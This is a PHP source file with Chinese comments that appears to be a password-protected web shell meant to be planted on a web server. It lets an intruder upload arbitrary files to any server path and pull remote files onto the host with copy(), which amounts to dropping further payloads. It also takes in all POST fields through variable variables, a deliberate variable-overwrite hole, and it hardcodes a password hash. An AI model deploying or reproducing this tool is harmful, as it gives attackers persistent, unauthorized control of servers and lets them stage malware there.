<?php
error_reporting(7);
@set_magic_quotes_runtime(0);
define('IS_GPC', get_magic_quotes_gpc());
@set_time_limit(0);
ignore_user_abort(true);


foreach($_POST as $key => $value) {
    if (IS_GPC) {
        $value = s_array($value);
    }
    $$key = $value;
}
/*===================== 程序配置 =====================*/

//echo encode_pass('danbaise.com');exit;
//danbaise.com = 3e2308151c8dd92002105f3366b8f8ed
// 如果需要密码验证,请修改登陆密码,留空为不需要验证
$pass  = '84711841'; //danbaise.com

//如您对 cookie 作用范围有特殊要求, 或登录不正常, 请修改下面变量, 否则请保持默认
// cookie 前缀
$cookiepre = '';
// cookie 作用域
$cookiedomain = '';
// cookie 作用路径
$cookiepath = '/';
// cookie 有效期
$cookielife = 86400;

/*===================== 配置结束 =====================*/

$self = $_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME'];
$timestamp = time();

/*===================== 身份验证 =====================*/
if ($_GET['action'] == "logout") {
    scookie('loginpass', '', -86400 * 365);
    @header('Location: '.$self);
    exit;
}
if($pass) {
    if ($action == 'login') {
        if ($pass == encode_pass($password)) {
            scookie('loginpass',encode_pass($password));
            @header('Location: '.$self);
            exit;
        }
    }
    if ($_COOKIE['loginpass']) {
        if ($_COOKIE['loginpass'] != $pass) {
            loginpage();
        }
    } else {
        loginpage();
    }
}
/*===================== 验证结束 =====================*/

/*===================== 函数库开始 =====================*/
function encode_pass($pass) {
    $pass = md5('danbaise'.$pass);
    $pass = md5($pass.'danbaise');
    $pass = md5('danbaise'.$pass.'danbaise');
    return $pass;
}

// 去掉转义字符
function s_array(&$array) {
    if (is_array($array)) {
        foreach ($array as $k => $v) {
            $array[$k] = s_array($v);
        }
    } else if (is_string($array)) {
        $array = stripslashes($array);
    }
    return $array;
}

function scookie($key, $value, $life = 0, $prefix = 1) {
    global $timestamp, $_SERVER, $cookiepre, $cookiedomain, $cookiepath, $cookielife;
    $key = ($prefix ? $cookiepre : '').$key;
    $life = $life ? $life : $cookielife;
    $useport = $_SERVER['SERVER_PORT'] == 443 ? 1 : 0;
    setcookie($key, $value, $timestamp+$life, $cookiepath, $cookiedomain, $useport);
}

function file_url($upload_dir,$filename,$path_v='/')
{
    foreach (explode('/', str_replace($_SERVER['DOCUMENT_ROOT'],'',$upload_dir)) as $k => $v) {
        $path_v.=$v;
    }
    $file_url='http://'.$_SERVER['SERVER_NAME'].($path_v=='/'?'/':$path_v.'/').$filename;
    return $file_url;
}

/*===================== 函数库结束 =====================*/

/*===================== 页面函数开始 =====================*/
$file_url='';
$upload_dir='';
if (isset($_GET['path'])) {
    $upload_dir=$_GET['path'];
}
$dir_arr = explode('/', dirname(__FILE__));
$dir_upload_count = count(explode('/', str_replace($_SERVER['DOCUMENT_ROOT'],'',dirname(__FILE__))));

if (empty($upload_dir)) {
    $upload_dir=dirname(__FILE__).'/';
}

if($_GET['action'] == 'upload'){
        $_path = $_POST['path'];
        $name =  $_FILES['name'];
        move_uploaded_file($name['tmp_name'],$upload_dir.$_path.$name['name']);
        $file_url=file_url($upload_dir,$name['name']);
}
if($_GET['action'] == 'upload_remote_file'){
        $remote_file = $_POST['remote_file'];
        $arr=explode('/', $remote_file);
        copy($remote_file,$upload_dir.end($arr));
        $file_url=file_url($upload_dir,end($arr));
}
?>

<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf8" />
<title></title>
<style type="text/css">
.f{font:11px Verdana;}
input {font:11px Verdana;BACKGROUND: #FFFFFF;height: 18px;border: 1px solid #666666;}
</style>
</head>

<body>
        <?php $root='';?>
        <?php $count=count($dir_arr)-$dir_upload_count;$j=0;?>
        <?php  foreach ($dir_arr as $key => $value):?>
            <?php if($j<$count){$j++;$root.=$value."/";continue;}?>
            <a href="?path=<?php $root.=$value."/"; echo $root;?>"><span class="f"><?php echo $value."/";?></span></a>
        <?php endforeach;?><p>

        <form method="post" action="?action=upload<?php if(!empty($upload_dir))echo "&path=".$upload_dir;?>" enctype="multipart/form-data" >
        <span class="f">File: </span><input type="file" name="name" value="" />
        <input type="hidden" name="path" value="" />
        <input type="submit" value="ok" />
        </form>

        <form method="post" action="?action=upload_remote_file<?php if(!empty($upload_dir))echo "&path=".$upload_dir;?>" enctype="multipart/form-data" >
        <span class="f">Remote File: </span><input type="txt" size="70" name="remote_file" value="" />
        <input type="submit" value="ok" /> 
        </form>

        <a href="<?php echo $self;?>"><span class="f">index</span></a> 
        <a href="?action=logout"><span class="f">logout</span></a> 
        <a href="<?php echo $file_url;?>"><span class="f"><?php echo $file_url;?></span></a>
</body>
</html>


<?php exit;//end main



function loginpage() {
?>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf8" />
<title></title>
<style type="text/css">
 .centered_div{
position:absolute;
top:45%; left:40%;
}
input {font:11px Verdana;BACKGROUND: #FFFFFF;height: 18px;border: 1px solid #666666;}
</style>
</head>

<body>
<div class="centered_div">
    <form method="POST" action="">
    <span style="font:11px Verdana;">Password: </span><input name="password" type="password" size="20">
    <input type="hidden" name="action" value="login">
    <input type="submit" value="Login">
    </form>
</div>
</body>
</html>
<?php
    exit;//end loginpage()
}